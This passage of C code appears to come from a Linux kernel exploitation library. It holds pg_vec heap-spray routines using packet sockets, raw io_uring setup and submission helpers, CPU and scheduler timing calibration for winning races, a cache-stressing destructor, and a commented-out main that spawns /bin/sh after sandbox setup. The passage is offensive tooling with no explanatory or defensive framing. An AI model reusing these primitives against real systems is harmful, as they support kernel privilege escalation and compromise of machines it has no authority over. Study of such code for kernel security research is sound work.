	void *addr = mmap(NULL, buf_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON|MAP_POPULATE, -1, 0);
	memcpy(addr, src_buf, buf_size);
	for(int i=0; i<num; i++) {
		ret = sendto(s, addr, buf_size, 0, (struct sockaddr *)&sa, sizeof(sa));
		if(ret < 0) error_out("[pg_vec_spray] sendto");
	}
	return s;
}

void setup_pg_vec()
{
	// bring up lo interface
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	struct ifreq req;
	memset(&req, 0, sizeof(req));
	strcpy(req.ifr_name, "lo");
	req.ifr_flags = IFF_UP|IFF_LOOPBACK|IFF_RUNNING;
	int ret = ioctl(fd, SIOCSIFFLAGS, &req);
	if(ret != 0) error_out("[setup_pg_vec] ioctl");
	close(fd);
}

void uring_mgr_setup(struct uring_mgr_t *mgr, u32 entries, int poll)
{
	// create io_uring fd
	struct io_uring_params setup_params = {0};
	if(poll) setup_params.flags = IORING_SETUP_IOPOLL;
	mgr->fd = syscall(__NR_io_uring_setup, entries, &setup_params);
	if(mgr->fd < 0) error_out("[io_uring_setup]");

	// map the ring buffer and the SQE(submission queue entry) buffer
	uint32_t sq_ring_sz = setup_params.sq_off.array + setup_params.sq_entries * sizeof(uint32_t);
	uint32_t cq_ring_sz = setup_params.cq_off.cqes + setup_params.cq_entries * sizeof(struct io_uring_cqe);
	uint32_t ring_sz = sq_ring_sz > cq_ring_sz ? sq_ring_sz : cq_ring_sz;
	uint32_t sqes_sz = setup_params.sq_entries * sizeof(struct io_uring_sqe);
	void *ring_ptr = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, mgr->fd, IORING_OFF_SQ_RING);
	mgr->sqes = mmap(NULL, sqes_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, mgr->fd, IORING_OFF_SQES);
	if((long)mgr->sqes < 0) error_out("[io_uring] mmap");

	// now initialize the completion queue
	struct cq_ring_t *cq_ring = &mgr->cq_ring;
	cq_ring->head = ring_ptr + setup_params.cq_off.head;
	cq_ring->tail = ring_ptr + setup_params.cq_off.tail;
	cq_ring->ring_mask = ring_ptr + setup_params.cq_off.ring_mask;
	cq_ring->ring_entries = ring_ptr + setup_params.cq_off.ring_entries;
	cq_ring->cqes = ring_ptr + setup_params.cq_off.cqes;

	// now initialize the submission queue
	struct sq_ring_t *sq_ring = &mgr->sq_ring;
	sq_ring->head = ring_ptr + setup_params.sq_off.head;
	sq_ring->tail = ring_ptr + setup_params.sq_off.tail;
	sq_ring->ring_mask = ring_ptr + setup_params.sq_off.ring_mask;
	sq_ring->ring_entries = ring_ptr + setup_params.sq_off.ring_entries;
	sq_ring->flags = ring_ptr + setup_params.sq_off.flags;
	sq_ring->array = ring_ptr + setup_params.sq_off.array;
}

void uring_submit(struct uring_mgr_t *mgr, struct io_uring_sqe *sqes, u32 num)
{
	struct sq_ring_t *sq_ring = &mgr->sq_ring;
	u32 index, tail, next_tail;
	tail = *sq_ring->tail;
	next_tail = tail + num;
	// if(next_tail >= *sq_ring->ring_entries) error_out("entry overflow");

	index = tail & *sq_ring->ring_mask;
	memcpy(&mgr->sqes[index], sqes, sizeof(struct io_uring_sqe)*num);

	sq_ring->array[index] = index;
	*sq_ring->tail = next_tail;
}

int uring_enter(struct uring_mgr_t *mgr, u32 to_submit, u32 min_complete)
{
	return syscall(__NR_io_uring_enter, mgr->fd, to_submit, min_complete, 0, NULL);
}

static void __attribute__((constructor)) init(void)
{
	// disable buffering
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	// very bad random seed lol
	srand(time(NULL));

	// initialize parameters
	min_cpu_freq = _get_cpu_freq();// KHz
	min_granularity = _get_min_gran();// NS
	msgmnb = _read_u64_from_file(MSGMNB_FILE);// NS
	cpu_num = _get_cpu_num();
	mem_size = _get_mem_size();
	optmem_max = _safe_read_u64_from_file(OPTMEM_MAX_FILE, 0x5000);
	idle_cpus = malloc(cpu_num*sizeof(*idle_cpus));
	reload_cpu_info();

	// calculate the minimal tsc in a minimal time slice:
	// (min_cpu_freq * 10^3) * (min_granularity / 10^9 ) = min_cpu_freq * min_granularity / (10 ^ 6)
	min_slice_tsc = (min_cpu_freq / 1000) * (min_granularity / 1000);

	// initialize cpu_mask
	CPU_ZERO(&cpu_mask);
	for(int i=0; i<cpu_num; i++) CPU_SET(i, &cpu_mask);

	// init urand_fd
	urand_fd = open("/dev/urandom", 0);
	if(unlikely(urand_fd < 0)) error_out("fail to open urandom");

#ifdef STRESS
	sleep(1);
#endif
}

static void __attribute__((destructor)) fini(void)
{
	stress_all_caches();
}

//int main()
//{
//	printf("min_cpu_freq: %lld\n", min_cpu_freq);
//	printf("min_granularity: %lld\n", min_granularity);
//	printf("min_slice_tsc: %lld\n", min_slice_tsc);
//	ts_fence();
//	set_cpu(1);
//	setup_sandbox();
//	system("/bin/sh");
//	while(1);
//}
